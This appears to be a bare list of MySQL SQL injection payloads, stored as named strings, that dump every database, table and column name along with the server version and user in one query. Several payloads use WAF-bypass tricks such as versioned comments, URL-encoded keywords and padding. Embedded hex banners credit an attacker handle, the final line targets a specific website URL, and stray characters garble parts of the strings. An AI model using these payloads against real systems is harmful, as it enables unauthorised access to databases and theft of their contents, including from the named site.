...
sdt = "div @x:=concat((select(@)from(Select(@:=0x00),(@r:=0),(select(@)from(informatio​?n_sc​hema.tables)Where(table_schema=database())and(@)in(@:=concat(@,0x3c62723e,​LP?AD(​@r:=@r%2b1,2,0x30),0x2e20,unhex(hex(table_name))))))x))"
sdtc = "div @x:=concat((select(@)from(Select(@:=0x00),(select(@)from(information_schema​?.col​umns)Where(table_schema=database())and(@)in(@:=concat(@,0x3c62723e,unhex(h​ex?(ta​ble_name)),0x203a3a3a20,unhex(hex(column_name))))))x))"
...
mdwf = "div @x:=concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c​​?62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207​​?e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636​f​6?c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e7​43​e2?03c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e​742​063?6f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,​@@ve​rsio?n_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=datab​ase()​,0x3c?62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@)/*!from*/(/*!12345selEcT*/(@:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@:=Concat/*!(@, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7​​?420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677​?2656​56e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,​da?tab​ase(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running​?_num​ber%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e​,c?olu​mn_name,0x3c2f666f6e743e))))x)))))*/"
mds = "div @x:=unhex(hex(concat(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c​?653e​,0x223e,0x273e,0x3c62723e3c62723e,concat(concat(0x3c63656e7465723e3c666f6e​74?206​36f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020​496e?20​4f6e652053686f74205175657279203a3a203c2f666f6e743e3c2f63656e7465723e3c2f​623e),?0​x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657​273696f6?​e203a3a20,version(),0x7e,@@version_comment,0x3c62723e5072696d617279204​4617461626​?17365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203​a3a20,user(​)?,concat(0x3c62723e3c62723e546f74616c204e756d626572204f662044617461​626173657320​3a?3a20,(select count(*) from information_schema.schemata),0x3c62723e546f74616c205461626c657320496e20416c​?6c20​446174616261736573203a3a20,(select count(*) from information_Schema.tables),0x3c62723e5461626c657320436f756e7420496e20507269​?6d61​7279204461746162617365203a3a20,(Select count(*) from information_Schema.tables where table_schema=database()),(select(@)from(select(@:=0x00),(@r:=0),(@running_n​?umbe​r:=0),(@tbl:=0x00),(select(0) from(information_schema.columns)where(table_schema=database()) and(0x00)in(@:=Concat(@, 0x3c62723e, if( (@tbl!=table_name), Concat(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,LP​?AD(@​r:=@r%2B1, 2, 0x30),0x2e,@tbl:=table_name,0x3c666f6e7420636f6c6f723d626c61636b3e203a3a204​?36f6​c756d6e7320496e2054686973205461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@tbl),0x20284461746162617365203a3a20,database(),0x29,0x3c2f666f6​?e743​e,0x3c62723e), 0x00),0x203a3a20,0x3c666f6e7420636f6c6f723d677265656e2073697a653d323e,0x7e2​?0,co​lumn_name,0x3c2f666f6e743e ))))x))))))"
dd = "div @x:=concat((select(@)from(select(@:=0x00),(select(@)from(information_schema​?.sch​emata)where(@)in(@:=concat(@,0x3c62723e,unhex(hex(schema_name))))))x))"
...
bdz = "div @x:=(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(table_schema=database())and(@​?:=co​ncat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))"
...
msd = "div @x:=make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where(tabl​?e_sc​hema=database())and @:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)"
...
dec = "div @x:=(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_​?sche​ma,0x203a3a20,table_name,0x203a3a20,column_name))),@)))"
dewc = "div @x:=make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where @:=make_set(511,@,0x3c6c693e,table_name,0x203a20,table_name,0x203a20,column​?_nam​e)),@)"
...
ueb = "div @x:=%63oncaT((%53elECt (@x) %66rom (%53elECt (@x:=0x00),(@r:=0),(%53elECt (0) from(%69nformation_schema.tables)%77here (%74ablE_schema=database()) and (0x00) in (@x:=%63oncat (@x,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1,2,0x3​?0),0​x2920,0x3c2f666f6e743e,%74able_name))))x)) %55nion %53elect "
escb = "div @x:=(concat_ws((0x0),(select(@)from(select(@:=0x00),(@r:=0),(select(@)from(​?info​rmatioN_schema.tables)where(table_Schema=database())and(@)in(@:=concat_ws(​(0?x0)​,(@),(0x3c62723e),(LPAD((@r:=@r%2b1),(2),(0x30))),(0x2e20),(table_name),(​0x0)?))​))x))))UNION(select([No.Of Cols Here With Separate Brackets like (1),(2),(3)])"
...
myb = "div @x:=concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e​?2a20​3a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204​e7?56d​626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d2​?0,co​ncat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6​?e742​0636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a​?20,(​select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d6772​?6565​6e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(​?sele​ct count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0​?,ben​chmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d7075727​?06c6​53e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c6​?2723​e3c62723e)"
...
uniq2 = "http://uit.com.pk/uit_2.php?id=2 div 0 union%23BBBBBBBBUUUUUUUUUUUFFFFFFFFFFFFFFFEEEEEEEEEEEEERRRRRRRRRRRRRRRR...O​?OOOO​OOOVVVVVVVEEEEEEEEEERRRRRRRRRRRRRFFFFFFFLLLLLLLLLLLOOOOOOOOOOWWWWWWWWWWWW%​0a?sel​ect 1,concat%23aaaaaaaaaaaaa%0a(' :: Injected By -tr0jAn* :: ' ,version%23aaaaaaaaa..aa%0a(),' :: ',database%23aaaaaa%0a()),0x0"
